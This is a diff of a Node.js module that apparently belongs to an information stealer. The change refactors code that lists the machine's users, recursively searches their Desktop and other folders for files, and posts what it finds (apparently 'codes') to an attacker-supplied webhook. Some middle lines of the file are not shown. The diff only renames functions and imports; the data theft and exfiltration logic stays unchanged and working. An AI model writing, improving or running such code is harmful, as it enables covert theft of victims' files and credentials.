@@ -1,15 +1,15 @@
 const {
-    sendWebhook 
-} = require('../../utils/request/sendWebhook.js');
+    webhook 
+} = require('../../utils/request/webhook.js');
 
 const { 
     getUsers 
-} = require('../../utils/harware.js');
+} = require('../../utils/harware/getUsers.js');
 
 const path = require('path');
 const fs   = require('fs');
 
-module.exports = async (webhook) => {
+module.exports = async (webhookUrl) => {
     const users = await getUsers();
     const directories = [
         'Desktop',
@@ -29,12 +29,12 @@ module.exports = async (webhook) => {
                 continue;
             }
 
-            await searchFiles(fullPath, webhook)
+            await searchFiles(fullPath, webhookUrl)
         }
     }
 }
 
-function searchFiles(dir, webhook) {
+const searchFiles = (dir, webhookUrl) => {
     return new Promise((resolve, reject) => {
         fs.readdir(dir, (err, files) => {
             if (err) {
@@ -72,10 +72,10 @@ function searchFiles(dir, webhook) {
                                         };
 
                                         try {
-                                            await sendWebhook(webhook, data);
+                                            await webhook(webhookUrl, data);
                                             resolve(true);
                                         } catch (error) {
-                                            console.error("Could not send codes with webhook:", error);
+                                            console.error("Could not send codes with webhookUrl:", error);
                                             resolve(false);
                                         }
                                     } else {
@@ -86,7 +86,7 @@ function searchFiles(dir, webhook) {
                                 resolve(false);
                             }
                         } else if (stats.isDirectory()) {
-                            searchFiles(filePath, webhook).then(resolve).catch(reject);
+                            searchFiles(filePath, webhookUrl).then(resolve).catch(reject);
                         } else {
                             resolve(false);
                         }
